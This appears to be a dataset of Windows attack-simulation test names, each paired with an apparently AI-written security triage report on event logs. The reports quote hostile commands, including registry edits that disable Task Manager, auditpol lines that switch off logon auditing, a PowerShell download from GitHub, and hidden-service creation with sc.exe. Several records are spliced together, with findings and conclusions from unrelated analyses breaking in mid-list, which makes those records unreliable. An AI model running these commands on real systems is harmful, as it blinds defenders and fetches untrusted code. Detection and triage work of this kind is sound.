  - Conduct deeper analysis into what the `data.007_DLL.msi` package contains, ensuring it corresponds to expected or authorized software.
  - Corroborate with network logs and endpoint telemetry data to determine any lateral movement or contact with known malicious IPs/domains.

- **User and System Validation:**
  - Verify with the user (particularly as this is the CEO's machine) whether they performed any software installations or ran any scripts around the logged times.

- **Increased Monitoring:**
  - Enhance monitoring on this and other critical systems for unauthorized PowerShell executions or policy violations.

- **Immediate Security Measures:**
  - Consider implementing PowerShell script-block logging and constrained language mode to ensure deeper inspection of executed scripts.

- **Assessment Aftermath:**
  - If further investigation links these actions to unauthorized or known malicious activity, elevate the resolution to MALICIOUS and commence incident response procedures to isolate and remediate affected systems."
Activate Windows NoPropertiesMyDocuments Group Policy Feature,"Upon analyzing the Windows event logs provided, here’s a detailed breakdown of findings related to suspicious or potentially malicious activity:

### Findings:

1. **Time Alteration Events:**
   - The System and Security logs contain multiple events related to time changes initiated by the `svchost.exe` process. Time change events by themselves are not inherently malicious but can be suspicious if frequent and without a valid reason, as attackers might alter time settings to manipulate logs.

2. **Process Execution Observations:**
   - In the Sysmon logs, there are numerous file and process creation events related to `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, `cmd.exe`, `reg.exe`, and various `MicrosoftEdgeUpdate.exe` processes.
   - The execution of `cmd.exe` with a command-line instruction to modify the Windows registry (`reg add`) is suspicious. Registry changes, especially when modifying system policies, can be indicative of an attempt to alter system behavior without user consent.
   - The `wsmprovhost.exe` process appears as a parent to several commands, indicating potential command execution or script running in a Windows Remote Management (WinRM) session. This can be typical of administrative tasks but can also indicate suspicious remote activity if not expected.

3. **Edge Update Processes:**
   - Numerous events show the execution of Edge Update processes. These processes are generally expected in a normal operational environment for updates. However, unusual frequency or anomalies in paths or parent-child relationships could indicate misuse.

### Assessment:

- **Command-line registry modifications** observed via `cmd.exe` (EventId 17981) are suspicious. Alterations to Explorer policies, such as setting `NoPropertiesMyDocuments`, may suggest attempts to restrict certain functionalities, typically in a non-standard compliance manner. This could be an indicator of an attempt to circumvent user controls or prepare the system for further exploitation.

- **Regular process execution patterns** for legitimate files (`MicrosoftEdgeUpdate.exe`, `wevtutil.exe`) are seen, but `cmd.exe` and `reg.exe` usage in the provided manner raise concerns unless confirmed as part of normal administrative or automated scripting tasks.

- **High integrity level and system integrity levels** for the processes indicate execution with elevated privileges, increasing the severity of potential risks posed by any misuse.

### Conclusion:

**Resolution:** **SUSPICIOUS**

The logs showcase potentially benign activities such as Edge updates and some administrative tasks. However, the registry alteration activity via `cmd.exe` and the context of such modifications raise a red flag that warrants further investigation. 

### Recommendations for Next Steps:

1. **Further Investigation:**
   - Verify the intent and origin of the `cmd.exe` registry operation. Check if this action aligns with established IT policies or administrative scripts.
   - Correlate these events with known scheduled tasks, scripts, or administrative actions. If none align, this may indicate unauthorized activity.
  
2. **Monitor and Capture Data:**
   - Enable enhanced monitoring for this host using the EDR platform to detect similar activities.
   - Set triggers for any unusual frequency of specific process creations, particularly around `cmd.exe`, `reg.exe`, or time change events.

   - Numerous entries relate to system processes:
     - **MicrosoftEdgeUpdate.exe**: Its execution and versioning logs appear consistent with typical update behaviors.
     - **wevtutil.exe** and **conhost.exe**: Multiple invocations of these processes by the `admin_test` user. While `wevtutil.exe` can manage event logs, it’s not typical to see frequent usage unless auditing or event log activities are ongoing.
     - **HOSTNAME.EXE and whoami.exe**: These are non-malicious system commands typically used to confirm networking and user context. This behavior could be routine but seems unobjectively clustered suggesting potentially automated input actions.
     - **cmd.exe initiating msiexec.exe**: This command line `/y` switch usually signifies a less common operation — possibly registering or updating a DLL without comprehensive user prompting. It's being executed from a temporary directory with an altered short path (`ADMIN_~1`), typically associated with obfuscation techniques or script automation.

3. **Potential Indicators of Malicious Activity:**
   - **Clustered Execution Pattern**: Anomalous and rapid invocations of `wevtutil.exe` and `conhost.exe`. These patterns could suggest a script or automated task running.
   - **Executing `msiexec.exe` in a Temporary Folder**: Highly unusual and a significant red flag. Packages run from temp folders with unusual switches relating to DLL interaction may infer misuse or malware trying to register deeper system hooks.

### Initial Conclusion:
- **SUSPICIOUS**: The event logs captured show benign activities related to software updates; however, the repetitive execution patterns of `wevtutil.exe` and the temporary directory execution of `msiexec.exe` are concerning.

### Recommendation:
1. **Immediate Investigation**: Ensure no unauthorized scripts or scheduled tasks are running with elevated privileges. Check recent changes to `Task Scheduler` or within the user's login scripts.
2. **Malware Scan**: Perform a comprehensive malware and full-system antivirus scan focusing on the temporary directories and ensuring software, including system updates, haven’t been altered.
3. **Audit User Activities**: Review the `admin_test` user's activity and any linked remote connections during this time window for indicators of compromised access or unwarranted privilege use.
4. **Network Traffic Analysis**: Look for any odd outbound connections correlating with these timestamps, possibly signaling command-and-control activities if this is a sophisticated attack.

Given the nature of the logs, while no direct compromise is evident, the behavior warrants further investigation to rule out exploitation or attack vectors previously undetected."
Create and Hide a Service with sc.exe,"Based on the provided logs, let's examine each type for indicators of suspicious or malicious activity:

### Windows PowerShell Log
There are no entries provided for the PowerShell log specifically, so we will focus on the data present in the other logs.

### Security Log
1. **Event ID 4616 (System Time Changed)**: 
   - Several entries show the system time being changed by the `LOCAL SERVICE` account. This behavior could be legitimate based on time synchronization services; however, it might also be used to manipulate logs if done by unauthorized sources. The frequent and rapid changes are worth noting.

2. **Event ID 4672 (Special Privileges Assigned to New Logon)**:
   - The user `admin_test` is granted a high level of privileges, including `SeDebugPrivilege`, which could be problematic if not standard for this account.
   
3. **Event ID 4624 (An Account was Successfully Logged On)**:
   - Indicates successful logons using NTLM, accessing the system remotely from `DESKTOP-3HL5B2P`. While not inherently malicious, the context matters. Here, it follows the granting of excessive privileges, raising flags about the legitimacy of this activity.

4. **Event ID 4634 (An Account was Logged Off)**:
   - Shows an account `admin_test` logging off, fitting into a pattern of brief session access potentially exploited for some activity.

### System Log
1. **Service Creation (Event ID 7045) involving Calc.exe**:
   - A service named `fileService` is created pointing to `C:\Windows\System32\calc.exe`. Calculators should not be run as services, suggesting a potential attempt to leverage system permissions for running non-standard executables.

### Sysmon Log
1. **Multiple Instances of `wevtutil.exe` and `conhost.exe`**: 
   - `wevtutil.exe` is running multiple times, likely to query or clear event logs, typically abnormal during regular usage unless there is a known administrative task.
   
2. **Cmd.exe with `sc.exe create` and `sdset`**:
   - This command line creates and modifies the security descriptor of the `fileService` service, confirming it was set up intentionally, possibly to exploit a legitimate service for malicious purposes.

### Application Log
- Two entries about services being stopped are generic and don't provide additional direct insights without corresponding detail.

### Assessment

Given the detailed review:

- Creation of a service leveraging `calc.exe` inherently has no legitimate justification, coupled with the manipulation of security descriptors to potentially allow broader access than intended.
- Rapid privilege escalations and multiple special privilege assignments to `admin_test` with unusual logon activity from a remote desktop.
- Patterns suggest the intention to establish persistence or hide activity from logs (i.e., wevtutil.exe executions).

### Conclusion: **MALICIOUS**

This activity goes beyond typical benign behavior, showing clear signs of unauthorized attempts to manipulate system settings, elevate privileges, and possibly maintain unauthorized access. Immediate remediation steps should be taken to isolate and clean this host, change credentials associated with suspicious access, and further investigate to ensure there are no residual threats or compromises on the network."
Enabling Restricted Admin Mode via Command_Prompt,"Based on the analysis of the provided Windows event logs, here are the key findings, suspicious behaviors, and final assessment:

### Security Logs
The provided security logs indicate changes in system time initiated by the `C:\\Windows\\System32\\svchost.exe` process. While time manipulation can be suspicious in certain contexts, such as covering tracks for malicious activities, it’s also possible that this is a benign activity caused by legitimate system maintenance tasks like syncing with a time server.

### Sysmon Logs
- **Frequent Use of `wevtutil.exe` and `conhost.exe`:** There are several entries showing the execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test`. `wevtutil.exe` is used to manage Windows event logs, which can be legitimate; however, frequent use, particularly if unauthorized, can indicate attempts to clear or export logs to cover malicious activities.
- **Execution of `whoami.exe` and `hostname.exe`:** These processes were executed with high integrity levels. They can be used for reconnaissance to gather information about the system and the currently logged in user, which is a common trait in attack scenarios.
- **Registry Modification Command:** The logs reveal `cmd.exe` executing a registry modification command involving `DisableRestrictedAdmin` which can be linked to disabling security features to maintain persistence or allow lateral movement.
- **Edge Update Activity:** There are numerous entries showing the execution of Microsoft Edge Update processes, which could be legitimate. However, the use of temp directories like `C:\\Program Files (x86)\\Microsoft\\Temp\\EU98AC.tmp\\MicrosoftEdgeUpdate.exe` could potentially be used to disguise a malicious payload as a seemingly legitimate update process.

### System Logs
The system logs significantly align with the security logs in showing normal time synchronization activities. In absence of any irregularities beyond time adjustments, which align with legitimate time syncs from the time server, these logs do not provide specific evidence of malicious activity.

### Application Logs
The application logs primary show typical activities related to Microsoft Edge updates. The stopping of a service isn’t inherently suspicious, but combined with the frequent, clustered events in the Sysmon logs, it calls for closer scrutiny regarding whether these are genuine Microsoft Edge activities or a cover for malicious processes.

### Assessment and Conclusion
- **Suspicious Events:** The combination of frequent usage of potentially sensitive utilities (`wevtutil.exe`), registry modifications, and reconnaissance-type commands (`whoami.exe`, `hostname.exe`) suggests suspicious activity that warrants further investigation.
- **Alert Context:** Given these activities were flagged on a CEO’s machine, the context suggests potential targeting of high-value assets, which elevates the risk associated with these suspicious activities.

2. **Use of `cmd.exe` with External Resources**:
   - A Sysmon entry shows a `cmd.exe` process with a command line executing `hh.exe` to access a URL on GitHub. This command could indicate an attempt to download content or potentially use Help files for exploit purposes (Event ID 1, ProcessId 3208, executing `hh.exe https://raw.githubusercontent.com/file/file-file/master/files/data.001/src/data.001.chm`).

3. **Suspicious Powershell Activity**:
   - There are Powershell script executions (`powershell.exe -ExecutionPolicy Restricted -Command...`) with command details that match invoking scripts to examine system files for potential vulnerabilities, such as checking the presence of certain INF files that can indicate install vectors for unauthorized software. This indicates potential for suspicious use of PowerShell on the machine.

4. **High-Privilege Logons**:
   - Multiple logon events with high privileges were recorded. The user ""admin_test"" exhibits several logons with Event ID 4672, indicating special privilege use. Event 4624 indicates Remote Desktop or network logons from IPs (192.168.0.102 and fe80::e3b5:5371:12a8:9c77), emphasizing the need for reviewing if these were legitimate sessions.

5. **Execution of Administrative Tools Normally Not Executed Together**:
   - Processes such as `wevtutil.exe` and `conhost.exe` were observed with Event ID 5. Tools like `wevtutil` might be used by attackers to export or clear event logs, potentially indicating an act to hide traces of unauthorized activities.

6. **Repetitive Credential Access Attempts**:
   - Events with Event ID 5379 repeatedly attempt to access credentials, as seen by the recorded attempts to read `MicrosoftAccount:user=02txoixylodcstop` credentials, which failed. Frequent access attempts with a failure code indicate scraping attempts.

**Assessment**:
The observations from the logs are indicative of suspicious activities that need further exploration. Access to URLs using executable processes typically disabled for security (such as Help Executables accessing external sites), time manipulation, and high privilege account activities intensify concerns around potential unauthorized access or ongoing compromise. Additionally, Powershell usage with restrictive commands further indicates potential scope for misuse which needs detailed investigation.

**Resolution**: **SUSPICIOUS**

**Guidance**:
1. **Immediate Actions**:
   - Investigate the legitimacy of the time adjustments and the command logged with `cmd.exe`.
   - Ensure the external network connections (IPs recorded) are from trusted sources and valid user actions.

     - **Concerns:** 
       - Use of temporary directories (`%tmp%`) and use of `csc.exe` and `regasm.exe` to potentially side-load or unregister DLLs can indicate attempts to execute malicious scripts or alter system configurations without raising major alarms.
       - The source file and DLL are stored in what seems to be a generic and unsanctioned location, further raising suspicions about their legitimacy and intent.
     - The timeline for these events coincides with activity tied to an administrative user ""SERVER002\\admin_test,"" also mentioned in other logs running both PowerShell and command-line operations.

3. **PowerShell log:**
   - Missing data, which is in itself noteworthy if events were removed, indicating potential deliberate log cleansing to evade detection.

4. **Security Log:**
   - No entries are available, which again raises concerns if unauthorized access was leveraged to hide trails.

### Assessment:
**SUSPICIOUS**

Given the compilation and registration activities combined with the lack of any explicit entries in PowerShell and Security logs, there is enough ground to rate this activity as suspicious. These actions are not inherently malicious but can often be an indicator of nefarious intentions, especially if not aligned with known administrative or maintenance tasks.

### Guidance:
1. **Investigate Further:**
   - Verify the authenticity and purpose of the compiled DLL (`data.009.dll`) and the C# source code involved.
   - Cross-reference with known administrative tasks or software deployment schedules to rule out legitimate activities.
   
2. **Conduct a Thorough Inspection:**
   - Check user ""SERVER002\\admin_test"" for unusual privileges or unexpected behaviors, such as recent password changes, or out-of-hours logins.
   - Assess server processes and any new services registered post these events to ensure no persistence mechanisms were established.

3. **Implement Reinforced Monitoring:**
   - Enhance logging and monitoring around the server and this specific admin account to capture any future attempts of potentially compromising activities.

4. **Consult the Endpoint Detection and Response (EDR):**
   - Use EDR tools to retrospectively analyze the entire system state around the timeframe the suspicious activity occurred for any anomalies."
Disable Windows Task Manager application,"### Analysis of Logs:

Upon review of the provided logs, several events stand out that require closer examination due to their potential implications:

1. **Registry Modification:**
   - In the Sysmon logs, there is a `cmd.exe` command executed to change a registry value:
     - `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableTaskmgr /t REG_DWORD /d 1 /f`
   - This command disables Task Manager, which is a common step malware takes to hinder user attempts to terminate malicious processes. This action is suspicious and indicative of potentially malicious activity.

2. **Frequent Execution of Native Windows Utilities:**
   - Multiple instances of PowerShell and command-line utilities (e.g., `HOSTNAME.EXE`, `whoami.exe`, `conhost.exe`) are observed.
   - However, frequent use of Windows utilities can often be legitimate, associated with system or software operations. The absence of specific malicious command-line arguments in these events tempers the concern.

3. **Edge Update Activities:**
   - Numerous entries related to `MicrosoftEdgeUpdate.exe` and other Edge Update-related tasks are present.
   - While these could be benign, such frequent updates and associated process creation can sometimes be leveraged for persistence or evasion techniques. Further scrutiny of the environment's policy for updates may clarify whether this is normal behavior.

4. **Time Synchronization Anomalies:**
   - Security events show time adjustments back by about two seconds around the same timestamp in the logs.
   - These could suggest attempts at timestamp manipulation; however, they align with normal time synchronization operations with `time.windows.com`.

### Assessment and Resolution:

Based on the log analysis:

- **Suspicious Findings:** The registry modification disabling Task Manager stands out as potentially malicious. Disabling Task Manager is a known tactic to prevent system remediation by the user.

- **Benign Activities:** Edge updates and time synchronization logs do not inherently suggest malicious activities without further contextual or correlating evidence.

### Recommended Actions:

1. **Investigate the Registry Modification:**
   - Conduct further forensic analysis to determine the source of the command that modified the registry.
   - Check for any unauthorized scripts or scheduled tasks that may have executed this command.
   
2. **Monitor Edge Update Activity:**
   - Verify whether the high frequency of Edge updates is expected in this environment or if it needs special consideration based on established baselines.

3. **Security Audit:**
   - Perform a security audit on the system to check for additional persistence mechanisms or unusual activities correlating with the suspicious events.

**Resolution: SUSPICIOUS**  
The event log findings, specifically the registry modification to disable Task Manager, necessitate further investigation to evaluate potential malicious intent or compromise."
Do Not Connect To Win Update,"In this detailed analysis, I will examine the provided logs in the System, Sysmon, Security, and Application categories to identify any suspicious or malicious activities.

### System Log Analysis
The System logs primarily show events related to time changes and time service activity, which are generally benign if associated with standard Windows time synchronization operations. The events show the time being set by the `svchost.exe` process shortly after machine startup. Changes in time zone or time adjustments do not inherently suggest malicious activity unless coordinated with logs showing unauthorized changes or activity.

### Sysmon Log Analysis
The Sysmon logs detail several process creation activities. The key observations include:

1. Execution of `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `hostname.exe` under the user `SERVER002\admin_test`.
2. Numerous instances of `wevtutil.exe`, potentially suggesting enumeration or manipulation of Windows Event Logs, which is often seen in stealthy or malicious activities.
3. The execution of `cmd.exe` with a command line modifying registry keys related to Windows Update (`DoNotConnectToWindowsUpdateInternetLocations`). This change could indicate an attempt to alter system update settings, which is suspicious if done without proper authorization.
4. The presence of high integrity levels for processes executed by the `admin_test` user, including registry changes, suggests privilege use that could be associated with suspicious behavior.

### Security Log Analysis
The Security logs mirror the time change activities illustrated in the System logs and further confirm that these actions were executed by `svchost.exe` run as `LOCAL SERVICE`. There are no direct indications of unauthorized access or privilege escalation.

### Application Log Analysis
The Application log contains a single event from the Software Protection Platform Service, which appears to be part of Windows licensing and does not directly indicate malicious behavior.

### Risk Assessment and Conclusion

- **Registry Modification:** The registry modification preventing connection to Windows Update internet locations without clarification or a corresponding legitimate action plan is concerning.
- **Frequent Log-Related Process Activity:** The repeated execution of `wevtutil.exe` could imply log tampering or reconnaissance activities, which are common preparatory actions for malicious endeavors.
  
**Conclusion: SUSPICIOUS**

Given the registry modification attempting to alter update paths and frequent `wevtutil.exe` usage without corroborating information on authorized maintenance or administrative task, there is reason to categorize this as `SUSPICIOUS` activity. It requires further investigation to validate if the actions were authorized or malicious. Follow-up actions should include:
- Verification of any scheduled tasks or maintenance activities around the time stamp of these logs.
- Examination of user actions and access permissions, especially `admin_test`.
- Network monitoring for any outbound connections that might relate to the suspicious registry change.
- Reviewing additional logs and systems for corroborating or conflicting evidence of benign vs. malicious behavior."
File Extension Masquerading,"Upon reviewing the provided logs, there are several notable findings that suggest potential malicious activity on the Windows host, Server002. Here is a detailed analysis:

### Suspicious and Anomalous Behaviors

1. **Unusual PowerShell Execution**:
   - The PowerShell log shows multiple instances where PowerShell scripts were executed from paths that are highly suspicious due to their naming convention (`data.003_masquerading.*.ps1`). This kind of naming often indicates an attempt to obfuscate or hide malicious activity under the guise of innocuous-looking file names.
   - The scripts are executed directly from the `Temp` directory, which is unusual for legitimate administrative scripts and is often indicative of malware operations.

2. **Use of System Utilities in a Scripted Execution Chain**:
   - The Sysmon logs reveal a sequence of commands, starting with `cmd.exe`, that copies and executes multiple files under the `Temp` directory with misleading file extensions (e.g., `docx.exe`, `pdf.exe`, `ps1.exe`). These executions resemble a process chain typical of a malicious script trying to avoid detection by disguising programs as legitimate documents or scripts.

3. **Masquerading Techniques**:
   - The files being executed (e.g., `data.003_masquerading.doc.ps1`, `data.003_masquerading.pdf.ps1`) indicate a classic masquerading technique where executable files are given extensions of common document types to deceive users or automated systems.
   - The use of Microsoft built-in tools like `wevtutil.exe` and `wscript.exe` to further facilitate script execution or log management without immediately raising alarms is a known tactic of advanced malware.

4. **Abnormal Credential Access Attempts**:
   - Multiple Event ID 5379 in the Security log indicates attempts to access credentials or secrets, all of which returned unsuccessful. While these attempts didn't succeed, their pattern is suspicious, as they repeatedly target Microsoft accounts related to this system.

5. **High-Privilege Logon and Privilege Escalation**:
   - Event ID 4624 and 4672 show high-privilege logons were performed by the SYSTEM account, a common indicator of privilege escalation or misuse, especially in the context of the other suspicious activities occurring around the same time.

### Conclusion and Resolution

Based on the evidence of coordinated, potentially obfuscated execution of scripts, the use of deceptive file extensions, and unsuccessful but suspicious attempts to access credentials, there are strong indicators of malicious activity.

### Resolution: **MALICIOUS**

### Guidance on How to Proceed

1. **Isolate the Host**: Immediately isolate Server002 from the network to prevent further spread or data exfiltration.

2. **Comprehensive Malware Scan**: Perform a deep malware scan with updated security tools to remove any discovered threats.

3. **Incident Response**: Engage the incident response team to perform digital forensics, including a thorough investigation of all newly created or modified files and registry entries.

4. **Review and Revise Policies**: Review security policies regarding the use of PowerShell and macros/scripts, ensuring that the least privilege principle is being enforced effectively.

5. **User Training**: Provide additional training for users of the affected machine to recognize social engineering attempts and phishing schemes that may have initiated this incident. 

Ensure that logs continue to be monitored for any further suspicious activities and that appropriate remediation steps are documented for future prevention."
Register Portable Virtualbox,"Upon analysis of the provided logs, several events suggest potentially suspicious activities that warrant further investigation. Here is a detailed breakdown:

1. **PowerShell Activity:**
   - There is a PowerShell execution with the following command: 
     ```
     powershell.exe & {New-Item -Type Directory (split-path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.006\bin\common.cab"") -ErrorAction ignore | Out-Null
     Invoke-WebRequest ""https://github.com/file/file-file/raw/master/files/data.006/bin/common.cab"" -OutFile ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.006\bin\common.cab""}
     ```
   - This command downloads a file from a GitHub repository using PowerShell's Invoke-WebRequest. Unsanctioned downloads, especially files like .cab (which could contain compressed files or executables), can be a sign of malicious activity when performed on a high-profile user’s account, such as the CEO.

2. **Process Executions and Command-Line Usage:**
   - The logs show cmd.exe executing a series of commands for VBoxSVC.exe, regsvr32, rundll32, sc, and VirtualBox driver-related tasks. Executing such commands through cmd.exe in a rapid sequence could indicate an attempt to install or manipulate software or services stealthily.
   - The use of regsvr32 and rundll32 in particular is notable because they are common utilities used in living-off-the-land attacks, where legitimate admin tools are utilized for malicious purposes.

3. **Privileged Processes and Services:**
   - The use of system-level privileges by services and processes such as msiexec.exe suggests activities with elevated permissions. Monitoring privileged operations is crucial as they can be exploited for installing software or performing system-level changes without detection.
   - The `SecurityHealthService.exe` and `svchost.exe` are executed under NT AUTHORITY\SYSTEM, which is expected, but the commands and paths associated with msiexec (often used for installing updates or new programs) should be scrutinized further.

4. **Credential Access and Security Logs:**
   - Security logs reveal attempts to access or query credentials (Event ID 5379), which could align with malicious attempts to harvest credentials from the system for lateral movement or further compromise.
   
5. **Services and Command Execution:**
   - Both Service Control and DLL executions (`sc.exe` and `dllhost.exe`) appear frequently, indicating potential service manipulations or interactions with Windows services. The context suggests the creation and starting of services which could represent either typical operations or unwanted modifications.

### Assessment and Conclusion
Based on the above observations, there is enough suspicious behavior to consider this activity beyond typical benign operations. While no single action definitively confirms malicious activity, the combination of downloaded files, command-line executions involving critical system utilities, and privileged access attempts indicates the potential for compromise.

### Resolution
**SUSPICIOUS** - The activity in the logs is suspicious and warrants further investigation. The combined use of PowerShell for unsanctioned remote file access, service manipulations, and sequence of system commands suggests that a deeper investigation is needed, particularly addressing the origin of the PowerShell command, verifying the nature of the downloaded files, and determining the legitimacy of the service commands and system-level actions.

### Recommendations for Further Investigation
1. **Investigate the Origin of PowerShell Commands**: Trace back who executed the command and whether such activity is typical for their profile.
2. **Verify Downloaded Files**: Check the common.cab file's content and source. Determine its purpose and legitimacy.
3. **Audit System and Application Changes**: Examine any changes made by the potentially related processes, verify if any applications or services were unexpectedly installed.
4. **Monitor for Future Activity**: Set up alerts for similar activities, especially focusing on unauthorized PowerShell use and registered services/utilities.
5. **User and Network Activity**: Review user activity logs thoroughly, and network connections established following these events.

In conclusion, while the activity remains suspicious, it does not categorically prove malicious intent without further tangible evidence, hence necessitating detailed examination into involved components and subsequent actions."
Impair Windows Audit Log Policy,"Upon analyzing the provided Windows event logs, several events and behaviors suggest suspicious and potentially malicious activity. Let's break down the findings:

### Key Observations:

1. **Command-Line Activity**:
   - A `cmd.exe` process was observed with the following command-line arguments:
     ```
     ""cmd.exe"" /c auditpol /set /category:""Account Logon"" /success:disable /failure:disable & auditpol /set /category:""Logon/Logoff"" /success:disable /failure:disable & auditpol /set /category:""Detailed Tracking"" /success:disable
     ```
   - This sequence of commands disables key audit policies related to account logon, logoff, and detailed tracking. Disabling these audit policies is a common tactic used by attackers to cover their tracks, reduce system logging, and avoid detection.

2. **Security Log Events (Event ID 4719)**:
   - Multiple security audit policy change events are logged indicating changes to audit policies. These events correspond to the command executed via `cmd.exe` to disable auditing.
   - The user responsible for these changes was `admin_test` and actions were performed under high integrity level, possibly indicating elevated privileges.

3. **System / Application Behavior Anomalies**:
   - The use of utilities like `wevtutil.exe`, `hostname.exe`, and `whoami.exe` in quick succession suggests potential reconnaissance or system enumeration activity often seen in malicious operations.
   - Frequent execution of `MicrosoftEdgeUpdate.exe` processes with different command-line arguments. While Edge updates can be a normal occurrence, the activity seems excessive and requires context consideration. These repeated and excessive updates might indicate misuse of legitimate binaries or living-off-the-land techniques by an attacker.

### Risk Assessment:

- **Suspicious Use of Built-in Tools**: The execution of system binaries like `cmd.exe`, `whoami.exe`, and `auditpol.exe` strongly suggests suspicious behavior when audit policies are being disabled. These actions can represent an attempt to escalate privileges or move laterally in the network.
  
- **Security Audit Policy Changes**: Disabling auditing through command-line execution represents a significant security risk, as it deliberately obfuscates system changes and activity, which is a common technique used by attackers post-compromise.

### Resolution:

Based on the detailed analysis of events indicating audit policy changes and the disabling of security logs, the activity within these logs could be indicative of preparation for further actions or persistence mechanisms. This leads to the following conclusion:

- **Resolution: MALICIOUS**: The observed activity of disabling audit policies, coupled with the apparent system reconnaissance, supports a conclusion of malicious activity. Immediate response measures should be taken.

### Recommended Actions:

1. **Containment and Eradication**:
   - Immediately isolate the affected host to prevent potential lateral movement within the network.
   - Investigate the source and nature of the `admin_test` actions especially focusing on how privileges were elevated.

2. **Remediation**:
   - Review and restore audit policies to ensure proper logging and monitoring operations are in place.
   - Conduct a thorough forensic analysis to identify signs of persistence or other compromised systems.

3. **Enhanced Monitoring and Review**:
   - Increase monitoring on similar activities across the network.
   - Conduct a full security review to ensure systems have appropriate security configurations and patches applied. 

4. **Incident Notification**:
   - Inform relevant stakeholders and consider regulatory requirements regarding potential data breaches or unauthorized system access."
Delete an entire folder - Windows cmd,"### Detailed Analysis

Upon reviewing the provided Sysmon logs, I have identified several patterns of activity that stand out due to their potential implications for security. Here are the key points of interest:

1. **Process Execution Patterns:**
   - **Whoami Executions:** Multiple instances of `whoami.exe` were executed with high integrity level by the user `SERVER002\admin_test`. While `whoami.exe` is generally benign, frequent and repeated invocations may suggest user enumeration activity.
   - **cmd.exe Activity:** There are multiple executions of `cmd.exe`, many of which were used with the `/c` parameter to execute conditional logic using `IF EXIST` to check for directories/files and execute `mkdir` and `rmdir` operations. These actions may suggest script-like behavior potentially involved in testing or configuration changes.
   - **wevtutil Activity:** Executions of `wevtutil.exe`, a utility for managing event logs, could indicate attempts to manipulate log files.

2. **Privilege Level and User Context:**
   - All the potentially suspicious command executions are made under the context of the user `SERVER002\admin_test` with a high integrity level, indicating administrative privileges.

3. **Timeline and Sequence:**
   - The sequence and timing of these events are tightly packed in a short period, which can be indicative of automated scripting activity.

4. **Tool Usage:**
   - **hostname.exe** use, like `whoami.exe`, can be part of normal administrative duties but could also be part of a script gathering information.
   - **wsmprovhost.exe** as parent process in multiple entries indicates the involvement of Windows Remote Management (WinRM) or Windows PowerShell operations, very typical of remote management tasks or script executions.

### Assessment

After analyzing the logs, the following points contribute to assessing the situation:

- **Normal Administrative Activity:** While tools like `cmd.exe`, `whoami.exe`, and `hostname.exe` can be part of normal administrative workflows, the automation-like pattern and usage of high integrity commands performed in rapid succession deviates from typical use patterns by an admin manually performing tasks.
  
- **Suspicious Patterns:** The use of multiple `cmd.exe` instances to perform directory checks and modifications might suggest something more than benign script execution, particularly if not previously planned or known by the admin. The use of `wevtutil.exe` is worth noting due to the potential for clearing or modifying event logs.

### Resolution

**SUSPICIOUS**

The activities logged do not conclusively indicate direct malicious behavior but show suspicious automation-like patterns and high-integrity-level executions that warrant further investigation. Detailed investigation into whether these actions align with legitimate scripts or maintenance activities is advised. If this sequence of events was unexpected or unauthorized, it could denote unauthorized scripting or reconnaissance activity.

### Recommendations

- **Further Investigation:** Verify with IT staff or the user `admin_test` if these actions were part of authorized tasks.
- **Review and Monitor Scripts:** Look for any scheduled tasks, scripts, or software that could have initiated these processes.
- **Audit and Analyze Logs:** Examine network logs and other logs (e.g., network firewall logs) for unexpected patterns that may correlate with these activities.
- **Implement Enhanced Monitoring:** Temporarily enhance monitoring on this host, particularly on processes and tools identified, to capture any continued or anomalous execution.
"
Lolbin Jsc.exe compile javascript to dll,"After analyzing the provided Windows event logs, several points of interest and potential anomalies have emerged:

1. **Logon and Privilege Escalation Events:**
    - Multiple events (Event ID 4624 and 4672) indicate a logon and associated privilege assignment with high-level privileges. This activity by itself is not necessarily indicative of malicious activity as it appears to be standard Windows operation with the SYSTEM account. No unusual domain names or user accounts were used in these events.

2. **Credential Request Events:**
    - Event ID 5379 shows a series of credential requests to `MicrosoftAccount:user=02txoixylodcstop` and similar targets, all of which returned a failure code (3221226021). These failures suggest attempts to access or authenticate using these credentials without success. While it could indicate a legitimate issue, it is also a point of suspicious behavior that merits further investigation.

3. **Windows Process Execution:**
    - Sysmon logs show command-line process executions like `cmd.exe` copying files and invoking `jsc.exe` for compiling. This kind of activity could be indicative of scripting or compilation tasks which could be normal or enable lateral movement or privilege escalation if done by unauthorized users.
    - Processes like `hostname.exe` and `whoami.exe` are usually used for reconnaissance to gather system and user information.
    - The presence of several `conhost.exe` and `wevtutil.exe` executions in close succession could suggest a script or tool executing multiple commands, potentially indicative of script-based attacks or administrative scripts running checks.

4. **Software Updates and Installations:**
    - Microsoft Edge installation/update processes are reflected in the logs (Event ID 1), indicating `setup.exe` running as part of the Edge update. These actions by themselves are benign if they align with expected software update timelines.

5. **System and Monitoring Processes:**
    - There are numerous entries related to system processes like `CompatTelRunner.exe`, `svchost.exe`, `dllhost.exe`, and `WmiPrvSE.exe`, which indicate standard telemetry, service hosting, and COM operations that are often visible in Windows environments.

**Conclusion:**

- **Credential Request Errors:** The failed credential requests regarding `MicrosoftAccount` strongly suggest suspicious behavior, especially if no legitimate processes should be accessing such credentials on that machine.
- **Miscellaneous Process Execution:** While several processes and operations could potentially be aligned with malicious activity, without additional context or unusual patterns like execution with non-standard parameters or from suspicious paths, they remain suspicious.

**Final Resolution:**

**SUSPICIOUS**

While the logs provide evidence of standard operations and some expected software installations, the repeated, failed credential request attempts and some command-line executions require further investigation to determine intent and context. It is crucial to cross-reference these activities with user behavior, scheduled tasks, and any known issues to rule out potential compromise. Further investigation should include:
- Checking for known compromises related to `MicrosoftAccount:user`.
- Analysis of external connections, particularly if any connections coincide with these events.
- Verification with system administrators or users if these actions align with expected tasks or updates."
Windows Auto Update Option to Notify before download,"### Detailed Analysis of Provided Logs:

#### Security Log:

1. **Event ID 4616**: Time adjustment logs showing changes in system time. This could be indicative of an attacker trying to cover tracks by altering timestamps, especially since time changes are manipulated by the `svchost.exe` process. However, the change here doesn't show malicious intent outright but should be reviewed in context with other activities.
   
2. **Event ID 4634**: Logoff event for `admin_test`. Logoff can be normal or suspicious based on the context and frequency of logons/logoffs.

3. **Event ID 4624 (Logon)**: `admin_test` logon event with `LogonType 3` (network). Network logons can be normal, but they should be monitored for unexpected patterns.

